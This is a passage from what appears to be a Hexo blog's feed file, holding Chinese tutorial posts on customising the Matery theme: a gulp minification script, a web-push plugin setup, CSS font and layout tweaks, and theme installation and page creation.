    <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>gulp<span class="token punctuation">.</span><span class="token function">dest</span><span class="token punctuation">(</span><span class="token string">"./public"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">// 压缩 public/uploads 目录内图片</span>
gulp<span class="token punctuation">.</span><span class="token function">task</span><span class="token punctuation">(</span><span class="token string">"compressImage"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> option <span class="token operator">=</span> <span class="token punctuation">{</span>
    optimizationLevel<span class="token punctuation">:</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//类型：Number  默认：3  取值范围：0-7（优化等级）</span>
    progressive<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//类型：Boolean 默认：false 无损压缩jpg图片</span>
    interlaced<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//类型：Boolean 默认：false 隔行扫描gif进行渲染</span>
    multipass<span class="token punctuation">:</span> <span class="token boolean">false</span> <span class="token comment" spellcheck="true">//类型：Boolean 默认：false 多次优化svg直到完全优化</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> gulp
    <span class="token punctuation">.</span><span class="token function">src</span><span class="token punctuation">(</span><span class="token string">"./public/medias/**/*.*"</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">gulpif</span><span class="token punctuation">(</span><span class="token operator">!</span>isScriptAll<span class="token punctuation">,</span> <span class="token function">changed</span><span class="token punctuation">(</span><span class="token string">"./public/medias"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">gulpif</span><span class="token punctuation">(</span>isDebug<span class="token punctuation">,</span> <span class="token function">debug</span><span class="token punctuation">(</span><span class="token punctuation">{</span> title<span class="token punctuation">:</span> <span class="token string">"Compress Images:"</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">plumber</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">imagemin</span><span class="token punctuation">(</span>option<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>gulp<span class="token punctuation">.</span><span class="token function">dest</span><span class="token punctuation">(</span><span class="token string">"./public"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">// 执行顺序： 清除public目录 -> 产生原始博客内容 -> 执行压缩混淆 -> 部署到服务器</span>
gulp<span class="token punctuation">.</span><span class="token function">task</span><span class="token punctuation">(</span>
  <span class="token string">"build"</span><span class="token punctuation">,</span>
  gulp<span class="token punctuation">.</span><span class="token function">series</span><span class="token punctuation">(</span>
    <span class="token string">"clean"</span><span class="token punctuation">,</span>
    <span class="token string">"generate"</span><span class="token punctuation">,</span>
    <span class="token string">"compressHtml"</span><span class="token punctuation">,</span>
    <span class="token string">"compressCss"</span><span class="token punctuation">,</span>
    <span class="token string">"compressJs"</span><span class="token punctuation">,</span>
    <span class="token string">"compressImage"</span><span class="token punctuation">,</span>
    gulp<span class="token punctuation">.</span><span class="token function">parallel</span><span class="token punctuation">(</span><span class="token string">"deploy"</span><span class="token punctuation">)</span>
  <span class="token punctuation">)</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">// 默认任务</span>
gulp<span class="token punctuation">.</span><span class="token function">task</span><span class="token punctuation">(</span>
  <span class="token string">"default"</span><span class="token punctuation">,</span>
  gulp<span class="token punctuation">.</span><span class="token function">series</span><span class="token punctuation">(</span>
    <span class="token string">"clean"</span><span class="token punctuation">,</span>
    <span class="token string">"generate"</span><span class="token punctuation">,</span>
    gulp<span class="token punctuation">.</span><span class="token function">parallel</span><span class="token punctuation">(</span><span class="token string">"compressHtml"</span><span class="token punctuation">,</span> <span class="token string">"compressCss"</span><span class="token punctuation">,</span> <span class="token string">"compressImage"</span><span class="token punctuation">,</span> <span class="token string">"compressJs"</span><span class="token punctuation">)</span>
  <span class="token punctuation">)</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//Gulp4最大的一个改变就是gulp.task函数现在只支持两个参数，分别是任务名和运行任务的函数</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>3 最后 <code>hexo clean</code> &amp;&amp; <code>hexo g</code> &amp;&amp; <code>gulp</code> &amp;&amp; <code>hexo d</code> 就可以了。</p>
<p>可能会遇到以下错误,执行即可。</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> -D babel-loader @babel/core @babel/preset-env webpack<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="Hexo-博客订阅文章通知功能"><a href="#Hexo-博客订阅文章通知功能" class="headerlink" title="Hexo 博客订阅文章通知功能"></a>Hexo 博客订阅文章通知功能</h3><p>进入站点根目录</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-web-push-notification --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>编辑站点配置文件<code>_config.yml</code></p>
<pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token key atrule">webPushNotification</span><span class="token punctuation">:</span>
  <span class="token key atrule">webpushrKey</span><span class="token punctuation">:</span> <span class="token string">"your webpushr rest api key"</span>
  <span class="token key atrule">webpushrAuthToken</span><span class="token punctuation">:</span> <span class="token string">"your webpushr authorize token"</span>
  <span class="token key atrule">trackingCode</span><span class="token punctuation">:</span> <span class="token string">"AEGlpbdgvBCWXqXI6PtsUzobY7TLV9gwJU8bzMktrwfrSERg_xnLVbjpCw8x2GmFmi1ZcLTz0ni6OnX5MAwoM88"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>进入：<a href="https://app.webpushr.com/signup">https://app.webpushr.com/signup</a> 注册账号</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210121164850.png" alt="按照步骤操作"></p>
<p><strong>按照步骤操作</strong></p>
<p>将第二步中所指的代码复制粘贴到你的 <code>layout.ejs</code>文件内,执行<code>hexo clean&amp;&amp;hexo g&amp;&amp;hexo d</code>部署即可！</p>
<p><strong>部署之后可能会遇到无法正常发送通知的情况.</strong></p>
<p>进入目录 <code>node_modules/hexo-web-push-notification/index.js</code>文件中第22行<code>'summary': util.stripHTML(newPost.excerpt),</code>这里取值取的是<code>excerpt</code>，改成<code>summary</code>即可。</p>
<p>修改前</p>
<pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">var</span> JSONFeed <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">'title'</span><span class="token punctuation">:</span> newPost<span class="token punctuation">.</span>title<span class="token punctuation">,</span>
        <span class="token string">'id'</span><span class="token punctuation">:</span> newPost<span class="token punctuation">.</span>path<span class="token punctuation">,</span>
        <span class="token string">'date_published'</span><span class="token punctuation">:</span> newPost<span class="token punctuation">.</span>date<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">'L'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token string">'summary'</span><span class="token punctuation">:</span> util<span class="token punctuation">.</span><span class="token function">stripHTML</span><span class="token punctuation">(</span>newPost<span class="token punctuation">.</span>excerpt<span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token string">'url'</span><span class="token punctuation">:</span> newPost<span class="token punctuation">.</span>permalink<span class="token punctuation">,</span>
        <span class="token string">'tags'</span><span class="token punctuation">:</span> newPost<span class="token punctuation">.</span>tags<span class="token punctuation">.</span>data<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> v<span class="token punctuation">.</span>name <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token string">'categories'</span><span class="token punctuation">:</span> newPost<span class="token punctuation">.</span>categories<span class="token punctuation">.</span>data<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> v<span class="token punctuation">.</span>name <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>修改后</p>
<pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">var</span> JSONFeed <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">'title'</span><span class="token punctuation">:</span> newPost<span class="token punctuation">.</span>title<span class="token punctuation">,</span>
        <span class="token string">'id'</span><span class="token punctuation">:</span> newPost<span class="token punctuation">.</span>path<span class="token punctuation">,</span>
        <span class="token string">'date_published'</span><span class="token punctuation">:</span> newPost<span class="token punctuation">.</span>date<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">'L'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token string">'summary'</span><span class="token punctuation">:</span> util<span class="token punctuation">.</span><span class="token function">stripHTML</span><span class="token punctuation">(</span>newPost<span class="token punctuation">.</span>summary<span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token string">'url'</span><span class="token punctuation">:</span> newPost<span class="token punctuation">.</span>permalink<span class="token punctuation">,</span>
        <span class="token string">'tags'</span><span class="token punctuation">:</span> newPost<span class="token punctuation">.</span>tags<span class="token punctuation">.</span>data<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> v<span class="token punctuation">.</span>name <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token string">'categories'</span><span class="token punctuation">:</span> newPost<span class="token punctuation">.</span>categories<span class="token punctuation">.</span>data<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> v<span class="token punctuation">.</span>name <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="修改博客标题在手机端的字体大小"><a href="#修改博客标题在手机端的字体大小" class="headerlink" title="修改博客标题在手机端的字体大小"></a>修改博客标题在手机端的字体大小</h3><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210121165023.png" alt="image-20210121165018893"><br><a href="https://github.com/blinkfox/hexo-theme-matery/issues/147">手机端，header不能自动适配屏幕大小，有错位</a></p>
<p>在主题文件的<code>source/css/my.css</code>文件中，新增下面这样的 CSS 代码，然后设置成自己喜欢的字体大小即可</p>
<pre class="line-numbers language-css"><code class="language-css"><span class="token comment" spellcheck="true">/* 修改首页轮播的标题大小 */</span>
<span class="token atrule"><span class="token rule">@media</span> only screen and <span class="token punctuation">(</span><span class="token property">max-width</span><span class="token punctuation">:</span> 601px<span class="token punctuation">)</span></span> <span class="token punctuation">{</span>
    <span class="token selector"><span class="token class">.bg-cover</span> <span class="token class">.title</span> </span><span class="token punctuation">{</span>
        <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token number">2.5</span>rem<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment" spellcheck="true">/* 修改博客标题的字体大小 */</span>
<span class="token atrule"><span class="token rule">@media</span> only screen and <span class="token punctuation">(</span><span class="token property">max-width</span><span class="token punctuation">:</span> 601px<span class="token punctuation">)</span></span> <span class="token punctuation">{</span>
    <span class="token selector">header <span class="token class">.brand-logo</span> <span class="token class">.logo-span</span> </span><span class="token punctuation">{</span>
        <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token number">1.5</span>rem<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>修改后</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210121165226.png" alt="image-20210121165130775"></p>
<h3 id="阅读文章的密码验证功能-私密文章设置"><a href="#阅读文章的密码验证功能-私密文章设置" class="headerlink" title="阅读文章的密码验证功能 私密文章设置"></a>阅读文章的密码验证功能 私密文章设置</h3><p>在主题<code>_config.yml</code>文件下设置 enable: true<br>然后在md文章的开头写上<code>password: XXX</code><br><img src="https://gitee.com/marmalade0/images/raw/master/img/20210121165227.png" alt="image-20210119164647298"><br><img src="https://gitee.com/marmalade0/images/raw/master/img/20210121165228.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/marmalade0/images/raw/master/img/20210121165229.png" alt="在这里插入图片描述"></p>
<h3 id="添加ICP-公网安备案号"><a href="#添加ICP-公网安备案号" class="headerlink" title="添加ICP/公网安备案号"></a>添加ICP/公网安备案号</h3><p><strong>打开<code>hexo/themes/matery/layout/_partial</code>路径下的<code>footer.ejs</code>文件，在合适的未知插入如下代码：</strong></p>
<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://gitee.com/marmalade0/images/blob/master/www.marmalade.vip/beian.png<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.beian.miit.gov.cn/<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name">  <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span><span class="token hexcode">#f72b07</span></span><span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>你自己的备案号，如鲁公网安备xxxxxx号<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><strong>添加后效果图：</strong></p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210121165230.png" alt="image-20210120134936541"></p>
<p>或者在<a href="marmalade.vip">我的小站</a>底部也能看见</p>
<h3 id="自定义字体"><a href="#自定义字体" class="headerlink" title="自定义字体"></a>自定义字体</h3><h4 id="全局字体自定义"><a href="#全局字体自定义" class="headerlink" title="全局字体自定义"></a>全局字体自定义</h4><ol>
<li>博客站点根目录下的 <code>source</code> 文件夹内创建一个名为 <code>font</code> 的文件夹，即文件夹路径为 <code>/source/font/</code> ，用来统一存放你要用到的字体。</li>
<li>将你要用到的字体放入上述创建的文件夹内，字体名称最好为英文，如 <code>/source/font/myFont.ttf</code></li>
<li>找到主题文件夹下的 <code>my.css</code> 文件，路径为 <code>/themes/matery/source/css/my.css</code> ，填入下面的代码：</li>
</ol>
<pre class="line-numbers language-css"><code class="language-css">
<span class="token atrule"><span class="token rule">@font-face</span></span><span class="token punctuation">{</span>
    <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">'myFont'</span><span class="token punctuation">;</span>
    <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url">url('../font/myFont.ttf')</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token selector">body</span><span class="token punctuation">{</span>
    <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">'myFont'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>将上面的 <code>myFont</code> 改成你自己的字体名称即可</p>
</blockquote>
<h4 id="局部字体自定义"><a href="#局部字体自定义" class="headerlink" title="局部字体自定义"></a>局部字体自定义</h4><blockquote>
<p>如果你不想全局字体自定义的话，就可以尝试一下局部字体自定义。</p>
</blockquote>
<ol>
<li>与全局字体自定义一样，我们需要创建 <code>font</code> 文件夹，将需要的字体放入，与上面的第 1、2 步一样，可以参考一下</li>
<li>找到主题文件夹下的 <code>my.css</code> 文件，路径为 <code>/themes/matery/source/css/my.css</code> ，并将下面的代码填入文件中。</li>
</ol>
<pre class="line-numbers language-css"><code class="language-css">
<span class="token atrule"><span class="token rule">@font-face</span></span><span class="token punctuation">{</span>
    <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">'myFont'</span><span class="token punctuation">;</span>
    <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url">url('../font/myFont.ttf')</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token selector"><span class="token class">.diyFont</span></span><span class="token punctuation">{</span>
    <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">'myFont'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p><strong>注意：</strong>这里是创建了一个 <code>diyFont</code> 的类，注意与全局字体自定义相区别</p>
</blockquote>
<p>当想要指定某个地方的字体自定义时候，可以通过<strong>右键审查元素</strong>找到那个字体的类，给于<strong>类</strong>或者在原有的类下面给于属性即可。</p>
<h4 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h4><p>找到你要自定义的区域，如我要自定义博客主页的标题字体，那么就要找到相应的文件，也就是 <code>/themes/matery/layout/_partial/bg-cover-content.ejs</code> ，在相应的地方加入我刚刚自定义的 <code>diyFont</code> 类。如将下面的：</p>
<pre class="line-numbers language-html"><code class="language-html">
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>title center-align<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">if</span> <span class="token attr-name">(config.subtitle</span> <span class="token attr-name">&amp;&amp;</span> <span class="token attr-name">config.subtitle.length</span> <span class="token punctuation">></span></span> 0) { %>
               &lt;%= config.subtitle %>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">}</span> <span class="token attr-name">else</span> <span class="token attr-name">{</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>
              subtitle
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">}</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>改为</p>
<pre class="line-numbers language-html"><code class="language-html">
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>title center-align diy-font<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">if</span> <span class="token attr-name">(config.subtitle</span> <span class="token attr-name">&amp;&amp;</span> <span class="token attr-name">config.subtitle.length</span> <span class="token punctuation">></span></span> 0) { %>
        &lt;%= config.subtitle %>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">}</span> <span class="token attr-name">else</span> <span class="token attr-name">{</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>
            subtitle
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">}</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>修改方法也就是在 <code>&lt;div class="title center-align"&gt;</code> 中增加自己定义的 CSS 类名，什么是类名，有些小伙伴也许不知道其含义，自行百度吧<span class="github-emoji"><span>🤣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f923.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>，也就是在 <code>class=""</code> 中添加自己自定义的名称。</p>
<p>之后的方法跟全局自定义字体一样，只不过需要将原本直接给 body 的属性变成给你设置的类，比如</p>
<pre class="line-numbers language-css"><code class="language-css"><span class="token atrule"><span class="token rule">@font-face</span></span><span class="token punctuation">{</span>
    <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">'字体名字'</span><span class="token punctuation">;</span>
    <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url">url('../font/你的字体.ttf')</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token selector"><span class="token class">.diy-font</span></span><span class="token punctuation">{</span>
    <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">'字体名字'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后执行命令，查看本地效果即可。</p>
<blockquote>
<p>我用的字体是汉仪行楷字体。</p>
</blockquote>
<p><a href="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20200217201857.png"><img src="https://gitee.com/marmalade0/images/raw/master/img/20210121174818.png" alt="img"></a></p>
<p><strong>参考</strong>：<a href="https://www.bwxyz.top/posts/7">https://www.bwxyz.top/posts/7</a><br><a href="https://www.cnblogs.com/guixinchn/p/13542439.html">参考文章1</a></p>
<p><a href="https://blog.csdn.net/tianjuewudi/article/details/112504019">参考文章2</a></p>
<p><a href="https://dokimaster.github.io/matery-zhu-ti-she-zhi/">参考文章3</a></p>
]]></content>
      <categories>
        <category>hexo+github博客建立与美化</category>
      </categories>
      <tags>
        <tag>Matery主题美化</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo-Matery主题细致美化(上)</title>
    <url>/Materysettings1.html</url>
    <content><![CDATA[<h2 id="Hexo-Matery主题美化"><a href="#Hexo-Matery主题美化" class="headerlink" title="Hexo-Matery主题美化"></a>Hexo-Matery主题美化</h2><p>在一番瞎改js代码后，终于无法忍受next主题，于是愤然投入Matery大家庭，结果证明，<strong>香！</strong><br>下面是我记录的配置Matery主题的流程，仅供后来的师傅们参考。</p>
<blockquote>
<p>大家可以来我Hexo博客主页看看具体效果 <a href="https://marmalade.vip/">我的小站</a></p>
</blockquote>
<h3 id="下载安装Matery主题"><a href="#下载安装Matery主题" class="headerlink" title="下载安装Matery主题"></a>下载安装Matery主题</h3><p>首先在<a href="https://hexo.io/themes/">hexo官网主题</a>里面搜索<strong>Matery</strong>主题点击进入作者大大的<a href="https://github.com/blinkfox/hexo-theme-matery">github</a>，然后下载 master 分支的最新稳定版的代码，解压缩后将 hexo-theme-matery 的文件夹重命名为matery，复制到Hexo 的 themes 文件夹中</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20200819224655.png" alt="img"></p>
<p>可以在themes 文件夹下使用Git clone命令来下载：</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/blinkfox/hexo-theme-matery.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h4 id="切换主题"><a href="#切换主题" class="headerlink" title="切换主题"></a>切换主题</h4><p>下载完后，将站点配置文件中的 theme 值修改为你下载主题的文件名</p>
<pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token comment" spellcheck="true"># Extensions</span>
<span class="token comment" spellcheck="true">## Plugins: https://hexo.io/plugins/</span>
<span class="token comment" spellcheck="true">## Themes: https://hexo.io/themes/</span>
<span class="token key atrule">theme</span><span class="token punctuation">:</span> matery<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>一些其他在站点目录配置：</p>
<p><code>language: zh-CN</code>网站的语言设置</p>
<p><code>url: https://www.guixinchn.cn</code> 网站的网站（域名）</p>
<p><code>per_page: 12</code>建议修改为 6 的倍数，主题排版比较好</p>
<h3 id="新建页面"><a href="#新建页面" class="headerlink" title="新建页面"></a>新建页面</h3><h4 id="1、标签页"><a href="#1、标签页" class="headerlink" title="1、标签页"></a>1、标签页</h4><pre class="line-numbers language-bash"><code class="language-bash">hexo new page <span class="token string">"tags"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>编辑新建的/source/tags/index.md文件</p>
<pre class="line-numbers language-front-matter"><code class="language-front-matter">---
title: tags
date: 2020-02-23 19:37:07
type: "tags"
layout: "tags"
---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="2、分类页"><a href="#2、分类页" class="headerlink" title="2、分类页"></a>2、分类页</h4><pre class="line-numbers language-bash"><code class="language-bash">hexo new page <span class="token string">"categories"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>编辑新建的/source/categories/index.md文件</p>
<pre class="line-numbers language-front-matter"><code class="language-front-matter">---
title: categories
date: 2020-02-23 19:37:07
type: "categories"
layout: "categories"
---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="3、关于页面"><a href="#3、关于页面" class="headerlink" title="3、关于页面"></a>3、关于页面</h4><pre class="line-numbers language-bash"><code class="language-bash">hexo new page <span class="token string">"about"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>编辑新建的/source/about/index.md文件</p>
<pre class="line-numbers language-front-matter"><code class="language-front-matter">---
title: about
date: 2020-02-23 19:37:07
type: "about"
layout: "about"
---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="4、留言板"><a href="#4、留言板" class="headerlink" title="4、留言板"></a>4、留言板</h4><pre class="line-numbers language-bash"><code class="language-bash">hexo new page <span class="token string">"contact"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>编辑新建的/source/contact/index.md文件</p>
<pre class="line-numbers language-front-matter"><code class="language-front-matter">---
title: contact
date: 2020-02-23 19:37:07
type: "contact"
layout: "contact"
---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="5、友情链接"><a href="#5、友情链接" class="headerlink" title="5、友情链接"></a>5、友情链接</h4><pre class="line-numbers language-bash"><code class="language-bash">hexo new page <span class="token string">"friends"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>编辑新建的/source/friends/index.md文件</p>
<pre class="line-numbers language-front-matter"><code class="language-front-matter">---
title: friends
date: 2020-02-23 19:37:07
type: "friends"
layout: "friends"
---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
